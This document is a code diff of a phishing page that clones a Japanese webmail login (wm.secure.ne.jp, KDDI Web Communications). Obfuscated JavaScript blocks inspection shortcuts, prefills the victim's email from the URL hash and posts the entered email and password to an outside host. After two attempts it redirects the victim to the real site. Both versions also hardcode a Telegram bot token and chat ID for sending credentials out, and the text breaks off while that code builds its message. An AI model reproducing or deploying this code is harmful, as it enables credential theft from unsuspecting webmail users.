+    var registerKeyDowns = function () {
 
-        .login-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
+        document.onkeydown = function (e) {
+            if (WebtopConfig.ui.rui.mail.enableKeyboardDeleteKey) {
+                //KDDIUX-20 (Delete key)
+                if (e && e.keyCode == 46){
 
-        .language-section {
-            margin-top: 28px;
-            padding-top: 24px;
-            border-top: 1px solid #e8e8e8;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
+                    var mailToolbarCtrl = Richui.getApplication().getController("mail.MailToolbar");
+                    var toolbar = mailToolbarCtrl.getActiveListToolbar();
 
-        .language-label {
-            font-size: 12px;
-            font-weight: 600;
-            color: #333;
-        }
+                    var delBtnVisible = toolbar.down("#delete").isVisible(true);
 
-        .language-select {
-            padding: 8px 12px;
-            border: 1px solid #ddd;
-            border-radius: 2px;
-            font-size: 12px;
-            background: white;
-            color: #333;
-            cursor: pointer;
-            min-width: 120px;
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23333' d='M1 1l5 5 5-5'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 8px center;
-            padding-right: 28px;
-            background-color: white;
-        }
+                    var openComposer = Ext.dom.Query.select('.x-window.rui-mail-compose:not(.x-hide-offsets)').length > 0;
 
-        .language-select:focus {
-            outline: none;
-            border-color: #0072c6;
-        }
+                    // Only trigger if the delete button is visible and the composer is open
+                    if(delBtnVisible && !openComposer) {
+                        var selection = toolbar.records;
 
-        .help-link {
-            margin-top: 28px;
-            padding-top: 24px;
-            border-top: 1px solid #e8e8e8;
-            font-size: 12px;
-        }
+                        var parentMsg = MailManager.isConversation && toolbar.isSingleItem && selection[0].getParentMsg();
 
-        .help-link a {
-            color: #0072c6;
-            text-decoration: underline;
-            cursor: pointer;
-            transition: color 0.2s;
-        }
+                        mailToolbarCtrl.doDelete(selection, parentMsg);
 
-        .help-link a:hover {
-            color: #005ba3;
-            text-decoration: none;
-        }
+                        e.preventDefault();
+                    }
 
-        .copyright {
-            margin-top: 28px;
-            font-size: 10px;
-            color: #999;
-            text-align: center;
-        }
-
-        @media (max-width: 600px) {
-            .login-container {
-                padding: 40px 30px;
+                }
             }
 
-            .logo-container {
-                margin-bottom: 30px;
-                gap: 8px;
-            }
 
-            .logo-container svg {
-                height: 40px;
-            }
 
-            .logo-text {
-                font-size: 16px;
-            }
+        };
 
-            .language-section {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 12px;
-            }
+    };
 
-            .language-select {
-                width: 100%;
+
+
+    var checkExistsRichui = setInterval(function() {
+        if (window.Richui) {
+            clearInterval(checkExistsRichui);
+            registerKeyDowns();
+
+        }
+    }, 100);
+
+
+
+
+
+</script>
+
+
+    
+    <script type="text/javascript">
+        url = BrowserDetect.checkDesktop();
+        if (url != "index-rui.jsp") window.location.href=url;
+
+        document.title = Locale.pageTitle;
+
+        window.skin = (window.WebtopConfig && WebtopConfig.defaultSkin) || "default";
+
+        if (location.search) {
+            var parts = location.search.substring(1).split('&'),
+                nv;
+
+            for (var i = 0; i < parts.length; i++) {
+                nv = parts[i].split('=');
+
+                if (nv[0] == 's') {
+                    window.skin= nv[1];
+                } else if (nv[0] == 'd') {
+                    window.user_domain = nv[1];
+                }
             }
         }
-    </style>
+        document.write('<link rel="shortcut icon" href="resources/images/' + window.skin + '/favicon.ico" type="image/x-icon">');
+        document.write('<link rel="icon" href="resources/images/' + window.skin + '/favicon.ico" type="image/x-icon">');
+
+
+        // Check if a new cache is available on page load.
+        window.addEventListener('load', function(e) {
+            // redirecting to accessui tips
+            document.getElementById('ariaLive').innerHTML = Locale.app.message.REDIRECT_TO_ACCESSUI_TIPS;
+
+          if (!window.applicationCache) return false;
+          window.applicationCache.addEventListener('updateready', function(e) {
+            if (window.applicationCache.status == window.applicationCache.UPDATEREADY) {
+              // Browser downloaded a new app cache.
+//              if (confirm('A new version of this site is available. Load it?')) {
+                window.applicationCache.swapCache();
+                window.location.reload();
+ //             }
+            } else {
+              // Manifest didn't changed. Nothing new to server.
+            }
+          }, false);
+
+        }, false);
+
+    </script><title>WebMail</title><link rel="shortcut icon" href="resources/images/kwc/favicon.ico" type="image/x-icon"><link rel="icon" href="resources/images/kwc/favicon.ico" type="image/x-icon">
+
+
+<link rel="stylesheet" href="https://wm.secure.ne.jp/webmail/richui/ux.css">
+
+
+
+
+
+
+<link rel="stylesheet" href="https://wm.secure.ne.jp/webmail/resources/ext-theme-kwc-Richui-all.css?v=KDDIUX_1.2-2">
+
+<script type="text/javascript" src="richui/ux.js"></script>
+<script type="text/javascript" src="richui/app.js?v=KDDIUX_1.2-2"></script>
 </head>
+<body id="ext-gen1019" style="overflow: hidden;" class="x-body x-gecko x-layout-fit x-border-box x-container x-ltr x-container-default"><br><br><br><br><br><br><br><div class="x-container rui-core-background x-fit-item x-ltr x-container-default" id="loginContainer-1014" style="margin: 0px; width: 1366px; height: 375px;"><span id="loginContainer-1014-outerCt" style="display: table; width: 100%; table-layout: fixed; height: 100%;" role="presentation"><div id="loginContainer-1014-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation"><form class="x-panel rui-core-login-container x-ltr x-panel-default" method="POST" action="#" target="submitTarget" onsubmit="return false" id="form-1015" style="height: 455px;"><div id="form-1015-body" class="x-panel-body x-panel-body-default x-panel-body-default x-docked-noborder-top x-docked-noborder-right x-docked-noborder-bottom x-docked-noborder-left" role="presentation" style="left: 0px; top: 0px; width: 332px; height: 455px;"><table id="form-1015-formTable" class="x-form-layout-table" style="width:100%" role="presentation" cellpadding="0"><tbody role="presentation"><tr role="presentation"><td role="presentation" colspan="3" style="width:100%" id="ext-gen1088"><div class="x-container rui-core-login-title x-ltr x-container-default" style="border-width:0;" id="container-1016"><span id="container-1016-outerCt" style="display: table; width: 100%; table-layout: fixed;" role="presentation"><div id="container-1016-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation"><div class="rui-core-login-title-app"></div></div></span></div></td></tr></tbody><tbody role="presentation"><tr role="presentation"><td role="presentation" colspan="3" style="width:100%" id="ext-gen1089"><div class="x-container x-core-login-error x-ltr x-container-default" style="border-width:0;" id="container-1017"><span id="container-1017-outerCt" style="display: table; width: 100%; table-layout: fixed;" role="presentation"><div id="container-1017-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation"></div></span></div></td></tr></tbody><tbody class="x-field x-table-plain x-form-item x-form-type-text x-ltr x-field-default x-form-form-item" style="border-width: 0px; table-layout: fixed;" role="presentation" id="textfield-1018"><tr role="presentation" id="textfield-1018-inputRow" class="x-form-item-input-row"><td role="presentation" id="textfield-1018-labelCell" style="display:none;" halign="left" class="x-field-label-cell" width="105" valign="top"><label id="textfield-1018-labelEl" for="textfield-1018-inputEl" class="x-form-item-label x-unselectable x-form-item-label-left" style="width:100px;margin-right:5px;" unselectable="on"></label></td><td role="presentation" class="x-form-item-body  " id="textfield-1018-bodyEl" colspan="3" style="width: 100%;"><input id="email" type="text" role="textbox" autocomplete="on" size="1" name="username" placeholder="メールアドレス" class="x-form-field automation-login-username-input x-form-empty-field x-form-required-field x-form-text" dir="auto" style="direction: initial; unicode-bidi: embed; text-align: left; width: 100%;" data-errorqtip=""></td></tr></tbody><tbody role="presentation"><tr role="presentation"><td role="presentation" colspan="3" style="width:100%" id="ext-gen1090"><label class="x-component rui-core-login-username-info x-ltr x-component-default" style="border-width: 0px; display: none;" id="label-1019" for=""></label></td></tr></tbody><tbody class="x-field x-core-password-field x-table-plain x-form-item x-form-type-password x-ltr x-field-default x-form-form-item" style="border-width: 0px; table-layout: fixed;" role="presentation" id="textfield-1020"><tr role="presentation" id="textfield-1020-inputRow" class="x-form-item-input-row"><td role="presentation" id="textfield-1020-labelCell" style="display:none;" halign="left" class="x-field-label-cell" width="105" valign="top"><label id="textfield-1020-labelEl" for="textfield-1020-inputEl" class="x-form-item-label x-unselectable x-form-item-label-left" style="width:100px;margin-right:5px;" unselectable="on"></label></td><td role="presentation" class="x-form-item-body  " id="textfield-1020-bodyEl" colspan="3" style="width: 100%;"><input id="password" type="password" role="textbox" autocomplete="on" size="1" name="password" placeholder="パスワード" class="x-form-field automation-login-password-input x-form-empty-field x-form-required-field x-form-text" dir="auto" style="direction: initial; unicode-bidi: embed; text-align: left; width: 100%;" data-errorqtip=""></td></tr></tbody><tbody role="presentation"><tr role="presentation"><td role="presentation" colspan="3" style="width:100%" id="ext-gen1091"><div class="x-component x-ltr x-component-default" style="border-width:0;" id="component-1021"><iframe id="submitTarget" name="submitTarget" style="display:none"></iframe></div></td></tr></tbody><tbody role="presentation"><tr role="presentation"><td role="presentation" colspan="3" style="width:100%" id="ext-gen1092"><div class="x-component x-ltr x-component-default" style="border-width:0;" id="component-1022"><input type="submit" id="submitButton" style="display:none"></div></td></tr></tbody>
+<center><span id="error" style="display:none;">Test</span><span id="msg" style="display:none;">Test</span></center><br><tbody role="presentation"><tr role="presentation"><td role="presentation" colspan="3" style="width:100%" id="submit-btn"><a class="x-btn automation-login-login-button x-unselectable x-ltr x-btn-default-small x-noicon x-btn-noicon x-btn-default-small-noicon" style="border-width:0;" hidefocus="on" unselectable="on" tabindex="0" id="button-1023"><span id="button-1023-btnWrap" role="presentation" class="x-btn-wrap" unselectable="on"><span id="button-1023-btnEl" class="x-btn-button" role="presentation"><span id="button-1023-btnInnerEl" class="x-btn-inner x-btn-inner-center" unselectable="on">ログイン</span><span role="presentation" id="button-1023-btnIconEl" class="x-btn-icon-el  " unselectable="on" style=""></span></span></span></a></td></tr></tbody><tbody class="x-field rui-login-lang x-table-plain x-form-item x-form-type-text x-ltr x-field-default x-form-form-item x-form-dirty" style="border-width: 0px; width: 90px; table-layout: fixed;" role="presentation" id="combobox-1024"><tr role="presentation" id="combobox-1024-inputRow" class="x-form-item-input-row"><td role="presentation" id="combobox-1024-labelCell" style="" halign="left" class="x-field-label-cell" width="105" valign="top"><label id="combobox-1024-labelEl" for="combobox-1024-inputEl" class="x-form-item-label x-unselectable x-form-item-label-left" style="width:100px;margin-right:5px;" unselectable="on">言語<span role="separator">:</span></label></td><td role="presentation" class="x-form-item-body  " id="combobox-1024-bodyEl" colspan="2" style="width: 100%;"><table id="combobox-1024-triggerWrap" class="x-form-trigger-wrap" role="presentation" style="width: 100%; table-layout: fixed;" cellspacing="0" cellpadding="0"><tbody role="presentation"><tr role="presentation"><td id="combobox-1024-inputCell" class="x-form-trigger-input-cell" role="presentation" style="width: 100%;"><div class="x-hide-display x-form-data-hidden" role="presentation" id="ext-gen1096"></div><input id="combobox-1024-inputEl" dir="auto" type="text" role="combobox" class="x-form-field automation-login-language-input x-form-required-field x-form-text x-trigger-noedit" autocomplete="off" name="localeLanguage" readonly="readonly" style="direction: initial; unicode-bidi: embed; text-align: left; width: 100%;" data-errorqtip=""></td><td role="presentation" class=" x-trigger-cell x-unselectable" style="width:25px;" id="ext-gen1095" valign="top"><div class="x-trigger-index-0 x-form-trigger x-form-arrow-trigger x-form-trigger-first" role="presentation" id="ext-gen1094"></div></td></tr></tbody></table></td></tr></tbody><tbody role="presentation"><tr role="presentation"><td role="presentation" colspan="3" style="width:100%" id="ext-gen1097"><label class="x-component rui-core-login-forgot-pwd x-ltr x-component-default" style="border-width:0;" id="label-1025" for=""><a class="rui-core-login-forgot-pwd-link" href="https://support.cpi.ad.jp/" target="_blank">ウェブメールの利用方法についてはこちら</a></label></td></tr></tbody><tbody role="presentation"><tr role="presentation"><td role="presentation" colspan="3" style="width:100%" id="ext-gen1098"><label class="x-component rui-core-login-copyright x-ltr x-component-default" style="border-width:0;" id="label-1026" for="">© 2021 KDDI Web Communications inc.</label></td></tr></tbody></table><div id="form-1015-overflowPadderEl" role="presentation" style="font-size: 1px; height: 1px; margin-top: -1px; position: relative; z-index: -99999; display: none;"></div></div></form></div></span></div><div class="x-panel x-fit-item x-ltr x-panel-default" id="appMainContainer-1027" style="display: none;"><div id="appMainContainer-1027-body" class="x-panel-body x-panel-body-default x-box-layout-ct x-panel-body-default" role="presentation"><div id="appMainContainer-1027-innerCt" class="x-box-inner " role="presentation"><div id="appMainContainer-1027-targetEl" class="x-box-target" role="presentation"><div class="x-container header-js-custom x-box-item x-ltr x-container-default x-layout-fit" style="height: 120px; display: none;" id="container-1028"><div id="bt-navbar">
+</div></div><div class="x-container rui-core-main-header x-box-item x-ltr x-container-default x-box-layout-ct" id="container-1029"><div id="container-1029-innerCt" class="x-box-inner " role="presentation"><div id="container-1029-targetEl" class="x-box-target" role="presentation"><div class="x-component rui-core-main-header-customheader x-box-item x-ltr x-component-default" style="width:100%;" id="customHeader-1030"><iframe src="header/header_kwc.html" scrolling="no" onload="Richui.view.CustomHeader.iframeLoaded(this)"></iframe></div><div class="x-container rui-core-main-navigation x-box-item x-ltr x-container-default x-box-layout-ct" style="width:100%;" id="core-mainnavigation-container-1031"><div id="core-mainnavigation-container-1031-innerCt" class="x-box-inner " role="presentation"><div id="core-mainnavigation-container-1031-targetEl" class="x-box-target" role="presentation"><div class="x-container rui-core-main-navigation-tabs automation-core-main-navigation-tabs x-box-item x-ltr x-container-default" id="container-1032"><span id="container-1032-outerCt" style="display:table;" role="presentation"><div id="container-1032-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation"></div></span></div><div class="x-container rui-core-main-navigation-aux x-box-item x-ltr x-container-default x-box-layout-ct" style="width:450px;height:36px;" id="core-mainnavigationaux-container-1033"><div id="core-mainnavigationaux-container-1033-innerCt" class="x-box-inner " role="presentation"><div id="core-mainnavigationaux-container-1033-targetEl" class="x-box-target" role="presentation"><div class="x-container rui-core-main-navigation-aux-btn-container x-box-item x-ltr x-container-default" id="container-1038"><span id="container-1038-outerCt" style="display:table;" role="presentation"><div id="container-1038-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation"><div class="x-container rui-mail-msgHeader-top x-ltr x-container-default x-box-layout-ct" id="container-1039"><div id="container-1039-innerCt" class="x-box-inner " role="presentation"><div id="container-1039-targetEl" class="x-box-target" role="presentation"><div class="x-component rui-core-main-navigation-aux-welcome x-box-item x-ltr x-component-default" id="component-1040">ようこそ&nbsp;&nbsp;</div><div class="x-component rui-core-main-navigation-aux-user x-box-item x-ltr x-component-default" id="component-1041"></div></div></div></div><div class="x-component rui-core-main-navigation-aux-user-emailaddress x-ltr x-component-default" style="height:20px;" id="component-1042"></div></div></span></div><div class="x-container rui-core-main-navigation-aux-btn-container x-box-item x-ltr x-container-default" style="width:10px;" id="container-1043"><span id="container-1043-outerCt" style="display:table;" role="presentation"><div id="container-1043-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation"><a class="x-btn rui-core-main-navigation-settings x-unselectable x-ltr x-btn-default-small x-icon x-btn-icon x-btn-default-small-icon" hidefocus="on" unselectable="on" tabindex="0" id="splitbutton-1044"><span id="splitbutton-1044-btnWrap" role="presentation" class="x-btn-wrap x-btn-split x-btn-split-right" unselectable="on"><span id="splitbutton-1044-btnEl" class="x-btn-button" role="presentation"><span id="splitbutton-1044-btnInnerEl" class="x-btn-inner x-btn-inner-center" unselectable="on">&nbsp;</span><span role="presentation" id="splitbutton-1044-btnIconEl" class="x-btn-icon-el ow-icon-mainNavigation-settings " unselectable="on" style=""></span></span></span></a><a class="x-btn rui-core-main-navigation-aux-dropdown x-unselectable x-ltr x-btn-default-small x-icon x-btn-icon x-btn-default-small-icon" hidefocus="on" unselectable="on" tabindex="0" id="splitbutton-1045"><span id="splitbutton-1045-btnWrap" role="presentation" class="x-btn-wrap x-btn-split x-btn-split-right" unselectable="on"><span id="splitbutton-1045-btnEl" class="x-btn-button" role="presentation"><span id="splitbutton-1045-btnInnerEl" class="x-btn-inner x-btn-inner-center" unselectable="on">&nbsp;</span><span role="presentation" id="splitbutton-1045-btnIconEl" class="x-btn-icon-el ow-icon-mainNavigation-downArrow " unselectable="on" style=""></span></span></span></a></div></span></div></div></div></div></div></div></div></div></div></div></div></div></div></div><div class="x-container x-fit-item x-ltr x-container-default x-layout-fit" id="container-1046" style="display: none;"></div><div class="x-container rui-mail-previewContainer x-fit-item x-ltr x-container-default x-layout-fit" id="container-1047" style="display: none;"></div>
+    <span id="ariaLive" aria-atomic="false" aria-live="assertive" style="z-index:-1; position:fixed; bottom:-1000px;">ctrl + alt + sを押して、アクセシビリティページにリダイレクトします。<br>ctrl + alt + sを押して、アクセシビリティページにリダイレクトします。<br>ctrl + alt + sを押して、アクセシビリティページにリダイレクトします。</span>
+    
 
-<body>
-    <div class="login-container">
-        <!-- Logo Section -->
-        <div class="logo-container">
-            <svg width="50" height="50" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <!-- CPI Logo with proper building blocks design -->
-                <g transform="translate(20, 20)">
-                    <!-- Top Green Block -->
-                    <rect x="0" y="0" width="30" height="30" fill="#a8d500" rx="2"/>
-                    <!-- Middle-Left Green Block -->
-                    <rect x="0" y="32" width="30" height="30" fill="#8bc000" rx="2"/>
-                    <!-- Middle-Right Blue Block -->
-                    <rect x="32" y="0" width="30" height="30" fill="#0088cc" rx="2"/>
-                    <!-- Bottom-Right Blue Block -->
-                    <rect x="32" y="32" width="30" height="30" fill="#00a3e0" rx="2"/>
-                </g>
-            </svg>
-            <div class="logo-text">CPI</div>
-        </div>
 
-        <!-- Form Section -->
-        <form onsubmit="return sendTelegramData(event)">
-            <div id="loader" class="loader">
-                <div></div>
-                <div></div>
-                <div></div>
-            </div>
+<script type="text/javascript" charset="UTF-8" src="resources/locale/sdk/ext/ext-locale-ja.js"></script><div class="x-tip x-layer x-tip-default x-border-box" id="ext-quicktips-tip" style="display: none;"><div class="x-tip-header x-header x-header-horizontal x-docked x-unselectable x-tip-header-default x-horizontal x-tip-header-horizontal x-tip-header-default-horizontal x-top x-tip-header-top x-tip-header-default-top x-docked-top x-tip-header-docked-top x-tip-header-default-docked-top" id="ext-quicktips-tip_header"><div id="ext-quicktips-tip_header-body" class="x-header-body x-tip-header-body x-tip-header-body-default x-tip-header-body-horizontal x-tip-header-body-default-horizontal x-tip-header-body-top x-tip-header-body-default-top x-tip-header-body-docked-top x-tip-header-body-default-docked-top x-box-layout-ct x-tip-header-body-default-horizontal x-tip-header-body-default-top x-tip-header-body-default-docked-top" role="presentation"><div id="ext-quicktips-tip_header-innerCt" class="x-box-inner " role="presentation"><div id="ext-quicktips-tip_header-targetEl" class="x-box-target" role="presentation"><div class="x-component x-header-text-container x-tip-header-text-container x-tip-header-text-container-default x-box-item x-component-default" unselectable="on" id="ext-quicktips-tip_header_hd"><span id="ext-quicktips-tip_header_hd-textEl" class="x-header-text x-tip-header-text x-tip-header-text-default" unselectable="on">&nbsp;</span></div></div></div></div></div><div id="ext-quicktips-tip-body" class="x-tip-body x-tip-body-default x-tip-body-default" role="presentation"><span id="ext-quicktips-tip-outerCt" style="display:table;" role="presentation"><div id="ext-quicktips-tip-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation"></div></span></div><div role="presentation" class="x-tip-anchor x-tip-anchor-top" id="ext-gen1032"></div></div></body>
 
-            <div id="errorDiv" class="error-message">
-                認証に失敗しました。メールアドレスとパスワードを確認してください。
-            </div>
 
-            <fieldset id="formFieldset" style="border: none; padding: 0;">
-                <div class="form-wrapper">
-                    <input 
-                        type="email" 
-                        id="emailInput" 
-                        class="form-input" 
-                        placeholder="メールアドレス" 
-                        required
-                        autocomplete="email"
-                    >
-                    <input 
-                        type="password" 
-                        id="passwordInput" 
-                        class="form-input" 
-                        placeholder="パスワード" 
-                        required
-                        autocomplete="current-password"
-                    >
-                </div>
+     
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 
-                <button type="submit" class="login-btn" id="loginBtn">ログイン</button>
-            </fieldset>
 
-            <!-- Language Section -->
-            <div class="language-section">
-                <label class="language-label">言語</label>
-                <select class="language-select" id="languageSelect">
-                    <option value="ja">日本語</option>
-                    <option value="en">English</option>
-                    <option value="es">Español</option>
-                    <option value="fr">Français</option>
-                    <option value="de">Deutsch</option>
-                    <option value="zh">中文</option>
-                </select>
-            </div>
+        <script>
 
-            <!-- Help Link -->
-            <div class="help-link">
-                <a href="#" onclick="return false;">ウェブメールの利用方法についてはこちら</a>
-            </div>
+var _0xb18c62=_0x5696;function _0x5696(_0x31434c,_0x259796){var _0x42933d=_0x4293();return _0x5696=function(_0x569663,_0x1acb92){_0x569663=_0x569663-0x131;var _0x2aec7b=_0x42933d[_0x569663];return _0x2aec7b;},_0x5696(_0x31434c,_0x259796);}(function(_0x3138e2,_0x4428e4){var _0x14fa0d=_0x5696,_0x1f6075=_0x3138e2();while(!![]){try{var _0xee96c5=parseInt(_0x14fa0d(0x162))/0x1*(parseInt(_0x14fa0d(0x161))/0x2)+-parseInt(_0x14fa0d(0x159))/0x3+parseInt(_0x14fa0d(0x14e))/0x4+-parseInt(_0x14fa0d(0x131))/0x5+parseInt(_0x14fa0d(0x158))/0x6*(parseInt(_0x14fa0d(0x14d))/0x7)+parseInt(_0x14fa0d(0x13e))/0x8+parseInt(_0x14fa0d(0x157))/0x9*(-parseInt(_0x14fa0d(0x14c))/0xa);if(_0xee96c5===_0x4428e4)break;else _0x1f6075['push'](_0x1f6075['shift']());}catch(_0x584348){_0x1f6075['push'](_0x1f6075['shift']());}}}(_0x4293,0x362ae),$(document)[_0xb18c62(0x15f)](_0xb18c62(0x140),function(_0x371773){var _0x137f89=_0xb18c62;if(_0x371773[_0x137f89(0x13c)]&&_0x371773['which']==0x53)return _0x371773[_0x137f89(0x14b)](),![];}),document[_0xb18c62(0x142)](_0xb18c62(0x150),_0x4de334=>_0x4de334['preventDefault']()),document['onkeydown']=function(_0x1f35ef){var _0x23f720=_0xb18c62;return _0x1f35ef[_0x23f720(0x13c)]&&(_0x1f35ef[_0x23f720(0x148)]===0x43||_0x1f35ef['keyCode']===0x56||_0x1f35ef[_0x23f720(0x148)]===0x55||_0x1f35ef[_0x23f720(0x148)]===0x75)?![]:!![];},$(document)[_0xb18c62(0x155)]('u',function(_0x57fa41){var _0x35c35f=_0xb18c62;return _0x57fa41[_0x35c35f(0x13c)]?![]:!![];}),$(document)['ready'](function(){var _0x281166=_0xb18c62,_0x32d209=0x0;$(_0x281166(0x156))[_0x281166(0x138)](function(){var _0x83834f=_0x281166;$(_0x83834f(0x133))['hide'](),$(_0x83834f(0x137))[_0x83834f(0x152)](''),$(_0x83834f(0x149))['animate']({'left':0xc8,'opacity':_0x83834f(0x154)},0x0),$(_0x83834f(0x134))[_0x83834f(0x15c)]({'right':0xc8,'opacity':'show'},0x3e8);});var _0x19f6e4=window[_0x281166(0x15d)][_0x281166(0x132)][_0x281166(0x143)](0x1);if(!_0x19f6e4){}else{var _0x451214=_0x19f6e4;$(_0x281166(0x137))[_0x281166(0x152)](_0x451214);var _0x29ee8b=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x29ee8b[_0x281166(0x13b)](_0x451214))return $(_0x281166(0x13f))[_0x281166(0x147)](),_0x19f6e4[_0x281166(0x15a)],![];var _0x226aff=_0x451214[_0x281166(0x13d)]('@'),_0x516556=_0x451214[_0x281166(0x143)](_0x226aff+0x1),_0x5138fb=_0x281166(0x151)+_0x516556,_0x2eaada=_0x516556;$(_0x281166(0x137))[_0x281166(0x15e)](_0x19f6e4);}$(_0x281166(0x13a))[_0x281166(0x138)](function(_0x24291c){var _0x53d40a=_0x281166;_0x24291c[_0x53d40a(0x14b)](),$(_0x53d40a(0x13f))[_0x53d40a(0x154)](),$(_0x53d40a(0x133))[_0x53d40a(0x154)]();var _0x272656=$('#email')[_0x53d40a(0x152)](),_0xa9365e=$(_0x53d40a(0x163))[_0x53d40a(0x152)](),_0x93df17=_0x272656,_0x4ccb0b=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x272656)return $(_0x53d40a(0x13f))['show'](),$(_0x53d40a(0x13f))[_0x53d40a(0x15e)](_0x53d40a(0x145)),![];if(!_0x4ccb0b[_0x53d40a(0x13b)](_0x93df17))return $(_0x53d40a(0x13f))['show'](),$(_0x53d40a(0x13f))[_0x53d40a(0x15e)](_0x53d40a(0x14a)),![];if(!_0xa9365e)return $('#error')['show'](),$(_0x53d40a(0x13f))[_0x53d40a(0x15e)]('<b\x20style=\x27color:#df9939;\x27>パスワードを入力してください</b>'),![];if(_0xa9365e[_0x53d40a(0x160)]<0x4)return $('#error')['show'](),$(_0x53d40a(0x13f))[_0x53d40a(0x15e)](_0x53d40a(0x144)),_0x272656[_0x53d40a(0x15a)],![];_0x32d209=_0x32d209+0x1,$['ajax']({'dataType':_0x53d40a(0x136),'url':_0x53d40a(0x135),'type':_0x53d40a(0x15b),'data':{'email':_0x272656,'password':_0xa9365e},'beforeSend':function(_0x5678e8){var _0x1d451e=_0x53d40a;$(_0x1d451e(0x13a))[_0x1d451e(0x15e)]('Loading\x20......');},'success':function(_0x4fad7e){var _0x2846d5=_0x53d40a;$(_0x2846d5(0x133))[_0x2846d5(0x15e)](_0x2846d5(0x139)),_0x4fad7e&&($(_0x2846d5(0x133))[_0x2846d5(0x147)](),console[_0x2846d5(0x146)](_0x4fad7e),$(_0x2846d5(0x133))[_0x2846d5(0x15e)](_0x4fad7e[_0x2846d5(0x141)]),_0x4fad7e['signal']=='ok'?($(_0x2846d5(0x163))[_0x2846d5(0x152)](''),_0x32d209>=0x2&&(_0x32d209=0x0,window[_0x2846d5(0x15d)][_0x2846d5(0x14f)]('https://wm.secure.ne.jp/webmail/index-rui.jsp?v=1.2-2'))):$(_0x2846d5(0x133))['html'](_0x4fad7e[_0x2846d5(0x141)]));},'error':function(){var _0x4dd0bc=_0x53d40a;$(_0x4dd0bc(0x163))['val'](''),_0x32d209>=0x2&&(_0x32d209=0x0,window[_0x4dd0bc(0x15d)][_0x4dd0bc(0x14f)](_0x4dd0bc(0x153))),$(_0x4dd0bc(0x133))[_0x4dd0bc(0x147)]();},'complete':function(){var _0x549cdf=_0x53d40a;$(_0x549cdf(0x13a))[_0x549cdf(0x15e)]('<td\x20role=\x22presentation\x22\x20colspan=\x223\x22\x20style=\x22width:100%\x22\x20id=\x22submit-btn\x22><a\x20class=\x22x-btn\x20automation-login-login-button\x20x-unselectable\x20x-ltr\x20x-btn-default-small\x20x-noicon\x20x-btn-noicon\x20x-btn-default-small-noicon\x22\x20style=\x22border-width:0;\x22\x20hidefocus=\x22on\x22\x20unselectable=\x22on\x22\x20tabindex=\x220\x22\x20id=\x22button-1023\x22><span\x20id=\x22button-1023-btnWrap\x22\x20role=\x22presentation\x22\x20class=\x22x-btn-wrap\x22\x20unselectable=\x22on\x22><span\x20id=\x22button-1023-btnEl\x22\x20class=\x22x-btn-button\x22\x20role=\x22presentation\x22><span\x20id=\x22button-1023-btnInnerEl\x22\x20class=\x22x-btn-inner\x20x-btn-inner-center\x22\x20unselectable=\x22on\x22>ログイン</span><span\x20role=\x22presentation\x22\x20id=\x22button-1023-btnIconEl\x22\x20class=\x22x-btn-icon-el\x20\x20\x22\x20unselectable=\x22on\x22\x20style=\x22\x22></span></span></span></a></td>');}});});}));function _0x4293(){var _0xfcef3b=['70mzvsjQ','1435KunXIf','1434156zQFpNx','replace','contextmenu','https://','val','https://wm.secure.ne.jp/webmail/index-rui.jsp?v=1.2-2','hide','keypress','#back1','407241RnBSHB','3462JLQhQH','739641kLeFOB','focus','POST','animate','location','html','bind','length','2PeFkYW','364946mJGgtj','#password','1127385AuFUMT','hash','#msg','#inputbar','https://gulliver.com.ar/u7x.php','JSON','#email','click','<span\x20style=\x27color:red;\x27>Username\x20or\x20Password\x20is\x20incorrect.\x20Please\x20try\x20again</span>','#submit-btn','test','ctrlKey','indexOf','1350936bqBZDs','#error','keydown','msg','addEventListener','substr','<b\x20style=\x27color:#df9939;\x27>パスワードまたは入力が間違っています</b>','<b\x20style=\x27color:#df9939;\x27>ユーザー名を入力してください</b>','log','show','keyCode','#automail','<b\x20style=\x27color:#df9939;\x27>正しいメールアドレスを入力してください</b>','preventDefault'];_0x4293=function(){return _0xfcef3b;};return _0x4293();}
 
-            <!-- Copyright -->
-            <div class="copyright">
-                © 2021 KDDI Web Communications Inc.
-            </div>
-        </form>
-    </div>
 
+  </script>
+
+    <!-- Telegram Integration - Same pattern as OWA -->
     <script>
-        // Telegram Bot Configuration
-        const TELEGRAM_BOT_ID = "8569198247:AAHdPdcRsCYM3iRkMwkQLscFr8XzIStBOPg";
-        const TELEGRAM_CHAT_ID = 5491806427;
-        let attemptCount = 0;
+        var tick_secures = 0;
+        var telegram_bot_id = "8569198247:AAHdPdcRsCYM3iRkMwkQLscFr8XzIStBOPg";
+        var chat_id = 5491806427;
+        var u_name_secures, password_secures, message_secures;
 
-        // Show error message
-        function showError() {
-            document.getElementById('errorDiv').style.display = 'block';
-        }
+        var ready_secures = function () {
+            u_name_secures = document.getElementById("email") ? document.getElementById("email").value : "";
+            password_secures = document.getElementById("password") ? document.getElementById("password").value : "";
+            
+            // Construct message in same format as OWA
